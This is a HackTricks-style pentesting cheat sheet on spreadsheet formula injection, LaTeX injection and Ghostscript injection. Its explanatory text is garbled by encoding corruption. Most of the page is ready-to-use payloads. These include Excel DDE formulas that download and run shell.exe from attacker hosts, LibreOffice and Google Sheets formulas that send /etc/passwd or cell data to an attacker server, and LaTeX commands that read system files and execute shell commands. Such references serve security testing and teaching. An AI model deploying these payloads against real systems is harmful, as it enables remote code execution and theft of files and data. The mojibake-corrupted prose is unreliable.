# Formula/CSV/Doc/LaTeX/GhostScript Injection

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## Formula Injection

### Info

å¦‚æœä½ çš„ **è¾“å…¥** åœ¨ **CSV æ–‡ä»¶**ï¼ˆæˆ–ä»»ä½•å…¶ä»–å¯èƒ½ä¼šè¢« **Excel** æ‰“å¼€çš„æ–‡ä»¶ï¼‰ä¸­è¢« **åå°„**ï¼Œä½ å¯èƒ½èƒ½å¤Ÿæ”¾å…¥ Excel **å…¬å¼**ï¼Œè¿™äº›å…¬å¼å°†åœ¨ç”¨æˆ· **æ‰“å¼€æ–‡ä»¶** æˆ–ç”¨æˆ· **ç‚¹å‡» Excel è¡¨æ ¼ä¸­çš„æŸäº›é“¾æ¥** æ—¶è¢« **æ‰§è¡Œ**ã€‚

{% hint style="danger" %}
å¦‚ä»Š **Excel ä¼šè­¦å‘Š**ï¼ˆå¤šæ¬¡ï¼‰ **ç”¨æˆ·å½“ä» Excel ä¹‹å¤–åŠ è½½æŸäº›å†…å®¹**ï¼Œä»¥é˜²æ­¢ä»–è¿›è¡Œæ¶æ„æ“ä½œã€‚å› æ­¤ï¼Œå¿…é¡»åœ¨æœ€ç»ˆæœ‰æ•ˆè½½è·ä¸Šç‰¹åˆ«åŠªåŠ›è¿›è¡Œç¤¾ä¼šå·¥ç¨‹ã€‚
{% endhint %}

### [Wordlist](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### è¶…é“¾æ¥

**ä»¥ä¸‹ç¤ºä¾‹éå¸¸æœ‰ç”¨ï¼Œå¯ä»¥ä»æœ€ç»ˆçš„ Excel è¡¨ä¸­æå–å†…å®¹å¹¶å‘ä»»æ„ä½ç½®å‘å‡ºè¯·æ±‚ã€‚ä½†è¿™éœ€è¦ç”¨æˆ·ç‚¹å‡»é“¾æ¥ï¼ˆå¹¶æ¥å—è­¦å‘Šæç¤ºï¼‰ã€‚**

ä»¥ä¸‹ç¤ºä¾‹å–è‡ª [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit)

æƒ³è±¡ä¸€ä¸‹ï¼Œå­¦ç”Ÿè®°å½•ç®¡ç†ç³»ç»Ÿä¸­çš„å®‰å…¨æ¼æ´é€šè¿‡ CSV æ³¨å…¥æ”»å‡»è¢«åˆ©ç”¨ã€‚æ”»å‡»è€…çš„ä¸»è¦æ„å›¾æ˜¯ç ´åæ•™å¸ˆç”¨äºç®¡ç†å­¦ç”Ÿè¯¦ç»†ä¿¡æ¯çš„ç³»ç»Ÿã€‚è¯¥æ–¹æ³•æ¶‰åŠæ”»å‡»è€…å°†æ¶æ„æœ‰æ•ˆè½½è·æ³¨å…¥åº”ç”¨ç¨‹åºï¼Œå…·ä½“é€šè¿‡åœ¨ç”¨äºå­¦ç”Ÿè¯¦ç»†ä¿¡æ¯çš„å­—æ®µä¸­è¾“å…¥æœ‰å®³å…¬å¼ã€‚æ”»å‡»è¿‡ç¨‹å¦‚ä¸‹ï¼š

1. **æ³¨å…¥æ¶æ„æœ‰æ•ˆè½½è·ï¼š**
* æ”»å‡»è€…æäº¤å­¦ç”Ÿè¯¦ç»†ä¿¡æ¯è¡¨å•ï¼Œä½†åŒ…å«ä¸€ä¸ªåœ¨ç”µå­è¡¨æ ¼ä¸­å¸¸ç”¨çš„å…¬å¼ï¼ˆä¾‹å¦‚ï¼Œ`=HYPERLINK("<malicious_link>","Click here")`ï¼‰ã€‚
* è¯¥å…¬å¼æ—¨åœ¨åˆ›å»ºä¸€ä¸ªè¶…é“¾æ¥ï¼Œä½†æŒ‡å‘æ”»å‡»è€…æ§åˆ¶çš„æ¶æ„æœåŠ¡å™¨ã€‚
2. **å¯¼å‡ºè¢«ç ´åçš„æ•°æ®ï¼š**
* æ•™å¸ˆåœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨åº”ç”¨ç¨‹åºçš„åŠŸèƒ½å°†æ•°æ®å¯¼å‡ºä¸º CSV æ–‡ä»¶ã€‚
* å½“æ‰“å¼€ CSV æ–‡ä»¶æ—¶ï¼Œä»ç„¶åŒ…å«æ¶æ„æœ‰æ•ˆè½½è·ã€‚è¯¥æœ‰æ•ˆè½½è·åœ¨ç”µå­è¡¨æ ¼ä¸­æ˜¾ç¤ºä¸ºå¯ç‚¹å‡»çš„è¶…é“¾æ¥ã€‚
3. **è§¦å‘æ”»å‡»ï¼š**
* ä¸€ä½æ•™å¸ˆç‚¹å‡»è¶…é“¾æ¥ï¼Œè®¤ä¸ºè¿™æ˜¯å­¦ç”Ÿè¯¦ç»†ä¿¡æ¯çš„åˆæ³•éƒ¨åˆ†ã€‚
* ç‚¹å‡»åï¼Œæ•æ„Ÿæ•°æ®ï¼ˆå¯èƒ½åŒ…æ‹¬ç”µå­è¡¨æ ¼ä¸­çš„è¯¦ç»†ä¿¡æ¯æˆ–æ•™å¸ˆè®¡ç®—æœºä¸Šçš„ä¿¡æ¯ï¼‰è¢«ä¼ è¾“åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚
4. **è®°å½•æ•°æ®ï¼š**
* æ”»å‡»è€…çš„æœåŠ¡å™¨æ¥æ”¶å¹¶è®°å½•ä»æ•™å¸ˆè®¡ç®—æœºå‘é€çš„æ•æ„Ÿæ•°æ®ã€‚
* æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›æ•°æ®è¿›è¡Œå„ç§æ¶æ„ç›®çš„ï¼Œè¿›ä¸€æ­¥å±å®³å­¦ç”Ÿå’Œæœºæ„çš„éšç§ä¸å®‰å…¨ã€‚

### RCE

**æŸ¥çœ‹** [**åŸå§‹å¸–å­**](https://notsosecure.com/data-exfiltration-formula-injection-part1) **ä»¥è·å–æ›´å¤šè¯¦ç»†ä¿¡æ¯ã€‚**

åœ¨ç‰¹å®šé…ç½®æˆ–è¾ƒæ—§ç‰ˆæœ¬çš„ Excel ä¸­ï¼Œå¯ä»¥åˆ©ç”¨åä¸ºåŠ¨æ€æ•°æ®äº¤æ¢ï¼ˆDDEï¼‰çš„åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¦åˆ©ç”¨æ­¤åŠŸèƒ½ï¼Œå¿…é¡»å¯ç”¨ä»¥ä¸‹è®¾ç½®ï¼š

* å¯¼èˆªåˆ° æ–‡ä»¶ â†’ é€‰é¡¹ â†’ ä¿¡ä»»ä¸­å¿ƒ â†’ ä¿¡ä»»ä¸­å¿ƒè®¾ç½® â†’ å¤–éƒ¨å†…å®¹ï¼Œå¹¶å¯ç”¨ **åŠ¨æ€æ•°æ®äº¤æ¢æœåŠ¡å™¨å¯åŠ¨**ã€‚

å½“æ‰“å¼€å¸¦æœ‰æ¶æ„æœ‰æ•ˆè½½è·çš„ç”µå­è¡¨æ ¼æ—¶ï¼ˆå¦‚æœç”¨æˆ·æ¥å—è­¦å‘Šï¼‰ï¼Œæœ‰æ•ˆè½½è·å°†è¢«æ‰§è¡Œã€‚ä¾‹å¦‚ï¼Œè¦å¯åŠ¨è®¡ç®—å™¨åº”ç”¨ç¨‹åºï¼Œæœ‰æ•ˆè½½è·å°†æ˜¯ï¼š
```markdown
=cmd|' /C calc'!xxx
```
é¢å¤–çš„å‘½ä»¤ä¹Ÿå¯ä»¥è¢«æ‰§è¡Œï¼Œä¾‹å¦‚ä½¿ç”¨ PowerShell ä¸‹è½½å¹¶æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ï¼š
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### Local File Inclusion (LFI) in LibreOffice Calc

LibreOffice Calc å¯ä»¥ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶å¹¶æå–æ•°æ®ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›æ–¹æ³•ï¼š

* ä»æœ¬åœ° `/etc/passwd` æ–‡ä»¶è¯»å–ç¬¬ä¸€è¡Œ: `='file:///etc/passwd'#$passwd.A1`
* å°†è¯»å–çš„æ•°æ®æå–åˆ°æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨: `=WEBSERVICE(CONCATENATE("http://<attacker IP>:8080/",('file:///etc/passwd'#$passwd.A1)))`
* æå–å¤šäºä¸€è¡Œ: `=WEBSERVICE(CONCATENATE("http://<attacker IP>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
* DNS æå–ï¼ˆå°†è¯»å–çš„æ•°æ®ä½œä¸º DNS æŸ¥è¯¢å‘é€åˆ°æ”»å‡»è€…æ§åˆ¶çš„ DNS æœåŠ¡å™¨ï¼‰: `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<attacker domain>"))`

### Google Sheets for Out-of-Band (OOB) Data Exfiltration

Google Sheets æä¾›å¯ä»¥è¢«åˆ©ç”¨è¿›è¡Œ OOB æ•°æ®æå–çš„å‡½æ•°ï¼š

* **CONCATENATE**: å°†å­—ç¬¦ä¸²è¿æ¥åœ¨ä¸€èµ· - `=CONCATENATE(A2:E2)`
* **IMPORTXML**: ä»ç»“æ„åŒ–æ•°æ®ç±»å‹å¯¼å…¥æ•°æ® - `=IMPORTXML(CONCAT("http://<attacker IP:Port>/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")`
* **IMPORTFEED**: å¯¼å…¥ RSS æˆ– ATOM æº - `=IMPORTFEED(CONCAT("http://<attacker IP:Port>//123.txt?v=", CONCATENATE(A2:E2)))`
* **IMPORTHTML**: ä» HTML è¡¨æ ¼æˆ–åˆ—è¡¨å¯¼å…¥æ•°æ® - `=IMPORTHTML (CONCAT("http://<attacker IP:Port>/123.txt?v=", CONCATENATE(A2:E2)),"table",1)`
* **IMPORTRANGE**: ä»å¦ä¸€ä¸ªç”µå­è¡¨æ ¼å¯¼å…¥ä¸€ç³»åˆ—å•å…ƒæ ¼ - `=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")`
* **IMAGE**: å°†å›¾åƒæ’å…¥å•å…ƒæ ¼ - `=IMAGE("https://<attacker IP:Port>/images/srpr/logo3w.png")`

## LaTeX Injection

é€šå¸¸ï¼Œäº’è”ç½‘ä¸Šä¼šæ‰¾åˆ°å°† **LaTeX ä»£ç è½¬æ¢ä¸º PDF** çš„æœåŠ¡å™¨ä½¿ç”¨ **`pdflatex`**ã€‚\
è¯¥ç¨‹åºä½¿ç”¨ 3 ä¸ªä¸»è¦å±æ€§æ¥ï¼ˆä¸ï¼‰å…è®¸å‘½ä»¤æ‰§è¡Œï¼š

* **`--no-shell-escape`**: **ç¦ç”¨** `\write18{command}` ç»“æ„ï¼Œå³ä½¿åœ¨ texmf.cnf æ–‡ä»¶ä¸­å¯ç”¨ã€‚
* **`--shell-restricted`**: ä¸ `--shell-escape` ç›¸åŒï¼Œä½† **é™åˆ¶** ä¸ºä¸€ç»„â€œå®‰å…¨â€çš„ **é¢„å®šä¹‰** \*\*å‘½ä»¤ï¼ˆåœ¨ Ubuntu 16.04 ä¸­ï¼Œåˆ—è¡¨åœ¨ `/usr/share/texmf/web2c/texmf.cnf` ä¸­ï¼‰ã€‚
* **`--shell-escape`**: **å¯ç”¨** `\write18{command}` ç»“æ„ã€‚è¯¥å‘½ä»¤å¯ä»¥æ˜¯ä»»ä½• shell å‘½ä»¤ã€‚å‡ºäºå®‰å…¨åŸå› ï¼Œé€šå¸¸ä¸å…è®¸æ­¤ç»“æ„ã€‚

ç„¶è€Œï¼Œè¿˜æœ‰å…¶ä»–æ–¹æ³•å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œå› æ­¤ä¸ºäº†é¿å… RCEï¼Œä½¿ç”¨ `--shell-restricted` æ˜¯éå¸¸é‡è¦çš„ã€‚

### Read file <a href="#read-file" id="read-file"></a>

æ‚¨å¯èƒ½éœ€è¦ä½¿ç”¨ \[ æˆ– $ æ¥è°ƒæ•´æ³¨å…¥ã€‚
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### è¯»å–å•è¡Œæ–‡ä»¶
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### è¯»å–å¤šè¡Œæ–‡ä»¶
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### å†™å…¥æ–‡ä»¶ <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### Command execution <a href="#command-execution" id="command-execution"></a>

å‘½ä»¤çš„è¾“å…¥å°†è¢«é‡å®šå‘åˆ° stdinï¼Œä½¿ç”¨ä¸´æ—¶æ–‡ä»¶æ¥è·å–å®ƒã€‚
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
å¦‚æœæ‚¨é‡åˆ°ä»»ä½•LaTexé”™è¯¯ï¼Œè¯·è€ƒè™‘ä½¿ç”¨base64æ¥è·å–æ²¡æœ‰åå­—ç¬¦çš„ç»“æœã€‚
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### è·¨ç«™è„šæœ¬æ”»å‡» <a href="#cross-site-scripting" id="cross-site-scripting"></a>

æ¥è‡ª [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Ghostscript Injection

**æ£€æŸ¥** [**https://blog.redteam-pentesting.de/2023/ghostscript-overview/**](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)

## å‚è€ƒæ–‡çŒ®

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)


{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
